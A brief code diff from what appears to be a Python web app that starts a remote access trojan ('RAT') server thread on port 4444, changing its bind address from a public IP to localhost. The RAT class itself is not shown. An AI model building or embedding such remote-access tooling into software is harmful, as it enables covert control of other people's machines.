@@ -17,8 +17,9 @@ app.add_middleware(
 
 
 def start_rat_server():
-    rat = RAT_SERVER('81.167.27.70', 4444)
+    rat = RAT_SERVER('localhost', 4444)
     rat.build_connection()
+
 
 rat_thread = threading.Thread(target=start_rat_server)
 rat_thread.start()
